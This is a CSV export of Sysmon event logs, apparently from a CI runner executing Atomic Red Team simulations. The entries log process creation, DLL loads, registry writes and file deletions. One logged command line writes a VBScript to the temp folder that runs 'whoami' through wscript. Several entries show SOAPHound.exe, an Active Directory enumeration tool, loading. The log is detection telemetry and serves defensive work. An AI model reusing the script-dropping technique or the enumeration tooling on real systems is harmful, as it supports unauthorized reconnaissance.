"12/17/2025 7:56:04 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:56:04.514
ProcessGuid: {f995aebf-6214-6942-b103-000000000e00}
ProcessId: 1860
Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\OpenConsole.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\PackagedCom\OpenConsoleProxy.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA256=D8EF36FC593530AD64DBEE74BC4D384D9413F235A4D34826A475A982DD79F54C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:04 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:04.441
ProcessGuid: {f995aebf-6214-6942-af03-000000000e00}
ProcessId: 7792
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: whoami
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-6214-6942-ae03-000000000e00}
ParentProcessId: 6188
ParentImage: C:\Windows\System32\wscript.exe
ParentCommandLine: ""C:\Windows\System32\WScript.exe"" ""C:\Users\RUNNER~1\AppData\Local\Temp\AtomicTest.vbs"" 
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:04 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:56:04.431
ProcessGuid: {f995aebf-6214-6942-ae03-000000000e00}
ProcessId: 6188
Image: C:\Windows\System32\wscript.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\MpClient.dll
FileVersion: 4.18.25110.5 (4a6978a838df7287d907bb2ee8a2eeb2373b186e)
Description: Client Interface
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: mpclient.dll
Hashes: SHA256=F1CA293E6D05A500EB026529A27948B01B6467D0E9C20C6049101C2B2829B96A
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:04 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:56:04.414
ProcessGuid: {f995aebf-6214-6942-ae03-000000000e00}
ProcessId: 6188
Image: C:\Windows\System32\wscript.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\MpOAV.dll
FileVersion: 4.18.25110.5 (4a6978a838df7287d907bb2ee8a2eeb2373b186e)
Description: IOfficeAntiVirus Module
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: MpOAV.dll
Hashes: SHA256=0EF8AE9CC8E3722C0AE09B55531BBA2F2A3422CCF4A1BB9B37ABDB4808AAC232
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:04 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:04.345
ProcessGuid: {f995aebf-6214-6942-ae03-000000000e00}
ProcessId: 6188
Image: C:\Windows\System32\wscript.exe
FileVersion: 10.0.26100.7019
Description: Microsoft ? Windows Based Script Host
Product: Microsoft ? Windows Script Host
Company: Microsoft Corporation
OriginalFileName: wscript.exe
CommandLine: ""C:\Windows\System32\WScript.exe"" ""C:\Users\RUNNER~1\AppData\Local\Temp\AtomicTest.vbs"" 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=EF603F10CFE6635756FE871D0DAD83D49E5DC552D8288395A745A14DCFE534D3
ParentProcessGuid: {f995aebf-6214-6942-ab03-000000000e00}
ParentProcessId: 9376
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c c:\windows\system32\cmd.exe /c cd /d %TEMP%\ & echo Set objShell = CreateObject(""WScript.Shell""):Set objExec = objShell.Exec(""whoami""):Set objExec = Nothing:Set objShell = Nothing > AtomicTest.vbs & AtomicTest.vbs
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:03 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 07:56:03.349
ProcessGuid: {f995aebf-6213-6942-a303-000000000e00}
ProcessId: 5848
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\NETWORK SERVICE"
"12/17/2025 7:56:03 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:03.308
ProcessGuid: {f995aebf-6213-6942-a303-000000000e00}
ProcessId: 5848
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: WMI Provider Host
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Wmiprvse.exe
CommandLine: C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {f995aebf-59d9-6942-e403-000000000000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=240C985EED57DEE92E0415F86CE67439E24179EA3281D57A395A90E92F6844D5
ParentProcessGuid: {f995aebf-59d8-6942-0e00-000000000e00}
ParentProcessId: 696
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch -p
ParentUser: NT AUTHORITY\SYSTEM"
"12/17/2025 7:54:03 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:54:03.385
ProcessGuid: {f995aebf-619b-6942-9803-000000000e00}
ProcessId: 8264
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_5rdj15dl.vau.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:54:02 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:54:02.449
ProcessGuid: {f995aebf-619a-6942-9103-000000000e00}
ProcessId: 8172
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Shell Extensions\Cached\{35786D3C-B075-49B9-88DD-029876E11C01} {ADD8BA80-002B-11D0-8F0F-00C04FD7D062} 0xFFFF
Details: Binary Data
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:54:02 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:54:02.447
ProcessGuid: {f995aebf-619a-6942-9103-000000000e00}
ProcessId: 8172
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Shell Extensions\Cached
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:54:02 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:54:02.435
ProcessGuid: {f995aebf-619a-6942-9103-000000000e00}
ProcessId: 8172
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Shell Extensions\Cached\{289AF617-1CC3-42A6-926C-E6A863F0E3BA} {ADD8BA80-002B-11D0-8F0F-00C04FD7D062} 0xFFFF
Details: Binary Data
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:54:02 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:54:02.435
ProcessGuid: {f995aebf-619a-6942-9103-000000000e00}
ProcessId: 8172
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Shell Extensions\Cached
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:54:02 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:54:02.253
ProcessGuid: {f995aebf-619a-6942-9103-000000000e00}
ProcessId: 8172
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_4c3tbidb.yju.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:54:01 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:54:01.960
ProcessGuid: {f995aebf-6199-6942-9003-000000000e00}
ProcessId: 9680
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:54:01 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:54:01.942
ProcessGuid: {f995aebf-6199-6942-8f03-000000000e00}
ProcessId: 4156
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:54:01 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:54:01.419
ProcessGuid: {f995aebf-6199-6942-8d03-000000000e00}
ProcessId: 6960
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_xlmgnd31.eua.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:54:01 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:54:01.052
ProcessGuid: {f995aebf-6198-6942-8b03-000000000e00}
ProcessId: 1692
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_qtyr4ryg.dru.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:54:00 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:54:00.687
ProcessGuid: {f995aebf-6198-6942-8903-000000000e00}
ProcessId: 1308
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_attlbsaq.02z.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:54:00 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:54:00.320
ProcessGuid: {f995aebf-6198-6942-8703-000000000e00}
ProcessId: 4376
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_fva3qkwe.c1h.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:53:59 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:53:59.942
ProcessGuid: {f995aebf-6197-6942-8503-000000000e00}
ProcessId: 5324
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ilxtjfdh.tvw.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:53:59 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:53:59.358
ProcessGuid: {f995aebf-6197-6942-8103-000000000e00}
ProcessId: 7064
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_sdpxasci.k04.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:53:58 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:53:58.995
ProcessGuid: {f995aebf-6196-6942-7f03-000000000e00}
ProcessId: 6948
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ekdxlqdk.vat.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:53:58 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:53:58.624
ProcessGuid: {f995aebf-6196-6942-7d03-000000000e00}
ProcessId: 6756
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_05yxobj0.nnp.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:53:58 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:53:58.241
ProcessGuid: {f995aebf-6196-6942-7b03-000000000e00}
ProcessId: 4476
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_0fpvj4at.c4c.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:53:57 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:53:57.807
ProcessGuid: {f995aebf-6195-6942-7903-000000000e00}
ProcessId: 3176
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_o5x5rys5.g30.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:53:57 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:53:57.324
ProcessGuid: {f995aebf-6195-6942-7703-000000000e00}
ProcessId: 7700
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_blwgf2sm.zws.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:53:57 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:53:57.018
ProcessGuid: {f995aebf-6194-6942-7503-000000000e00}
ProcessId: 4572
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Windows\Temp\art-marker.txt
Hashes: SHA256=BBA3706E6CE40F5F64A0AE1E5560BFE606196419FC225A841E479F89035E5B3A
IsExecutable: false
Archived: true"
"12/17/2025 7:53:56 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:53:56.838
ProcessGuid: {f995aebf-6194-6942-7503-000000000e00}
ProcessId: 4572
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_pyo4dcod.cjv.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:53:55 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:53:55.614
ProcessGuid: {f995aebf-6193-6942-6b03-000000000e00}
ProcessId: 7196
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_alqfnp1m.etx.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:53:55 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:53:55.128
ProcessGuid: {f995aebf-6193-6942-6903-000000000e00}
ProcessId: 8224
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_gj03dym4.yeo.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:53:54 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:53:54.650
ProcessGuid: {f995aebf-6192-6942-6703-000000000e00}
ProcessId: 5512
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_scoyrrjy.uua.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:53:54 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:53:54.049
ProcessGuid: {f995aebf-6192-6942-6403-000000000e00}
ProcessId: 1856
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:53:54 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:53:54.031
ProcessGuid: {f995aebf-6192-6942-6303-000000000e00}
ProcessId: 2844
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:53:50 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:53:50.308
ProcessGuid: {f995aebf-618e-6942-6203-000000000e00}
ProcessId: 2652
Image: C:\AtomicRedTeam\atomics\T1059.001\bin\SOAPHound.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\X86\MpClient.dll
FileVersion: 4.18.25110.5 (4a6978a838df7287d907bb2ee8a2eeb2373b186e)
Description: Client Interface
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: mpclient.dll
Hashes: SHA256=DBF7C626F1B93BDFDEC7C06A9788F1738990C2600116C3A488D4708B971C70CE
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:53:50 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:53:50.306
ProcessGuid: {f995aebf-618e-6942-6203-000000000e00}
ProcessId: 2652
Image: C:\AtomicRedTeam\atomics\T1059.001\bin\SOAPHound.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\X86\MpOAV.dll
FileVersion: 4.18.25110.5 (4a6978a838df7287d907bb2ee8a2eeb2373b186e)
Description: IOfficeAntiVirus Module
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: MpOAV.dll
Hashes: SHA256=198AE161365EA2EF37A85E22F660096D84EFC55EAAD0833C9FF451E62A05CAAA
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:53:50 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:53:50.272
ProcessGuid: {f995aebf-618e-6942-6203-000000000e00}
ProcessId: 2652
Image: C:\AtomicRedTeam\atomics\T1059.001\bin\SOAPHound.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework\v4.0.30319\clrjit.dll
FileVersion: 4.8.9310.0 built by: NET481REL1LAST_C
Description: Microsoft .NET Runtime Just-In-Time Compiler
Product: Microsoft? .NET Framework
Company: Microsoft Corporation
OriginalFileName: clrjit.dll
Hashes: SHA256=7505C375647F4E64ADA627089217984DE698E9F5D2B2EE33AF4F8674644F1597
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:53:50 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:53:50.254
ProcessGuid: {f995aebf-618e-6942-6203-000000000e00}
ProcessId: 2652
Image: C:\AtomicRedTeam\atomics\T1059.001\bin\SOAPHound.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework\v4.0.30319\clr.dll
FileVersion: 4.8.9310.0 built by: NET481REL1LAST_C
Description: Microsoft .NET Runtime Common Language Runtime - WorkStation
Product: Microsoft? .NET Framework
Company: Microsoft Corporation
OriginalFileName: clr.dll
Hashes: SHA256=3E10AA220D63BF5A29D7CA8423856D8993D469D9D74382309205505AEADFD0F8
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:53:50 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:53:50.159
ProcessGuid: {f995aebf-618e-6942-6003-000000000e00}
ProcessId: 1384
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_k0vjb3um.hsk.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:53:48 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:53:48.346
ProcessGuid: {f995aebf-618b-6942-5f03-000000000e00}
ProcessId: 6504
Image: C:\AtomicRedTeam\atomics\T1059.001\bin\SOAPHound.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\X86\MpClient.dll
FileVersion: 4.18.25110.5 (4a6978a838df7287d907bb2ee8a2eeb2373b186e)
Description: Client Interface
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: mpclient.dll
Hashes: SHA256=DBF7C626F1B93BDFDEC7C06A9788F1738990C2600116C3A488D4708B971C70CE
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:53:48 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:53:48.340
ProcessGuid: {f995aebf-618b-6942-5f03-000000000e00}
ProcessId: 6504
Image: C:\AtomicRedTeam\atomics\T1059.001\bin\SOAPHound.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\X86\MpOAV.dll
FileVersion: 4.18.25110.5 (4a6978a838df7287d907bb2ee8a2eeb2373b186e)
Description: IOfficeAntiVirus Module
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: MpOAV.dll
Hashes: SHA256=198AE161365EA2EF37A85E22F660096D84EFC55EAAD0833C9FF451E62A05CAAA
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:53:47 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:53:47.677
ProcessGuid: {f995aebf-618b-6942-5f03-000000000e00}
ProcessId: 6504
Image: C:\AtomicRedTeam\atomics\T1059.001\bin\SOAPHound.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework\v4.0.30319\clrjit.dll
FileVersion: 4.8.9310.0 built by: NET481REL1LAST_C
Description: Microsoft .NET Runtime Just-In-Time Compiler
Product: Microsoft? .NET Framework
Company: Microsoft Corporation
OriginalFileName: clrjit.dll
Hashes: SHA256=7505C375647F4E64ADA627089217984DE698E9F5D2B2EE33AF4F8674644F1597
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:53:47 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:53:47.318
ProcessGuid: {f995aebf-618b-6942-5f03-000000000e00}
ProcessId: 6504
Image: C:\AtomicRedTeam\atomics\T1059.001\bin\SOAPHound.exe
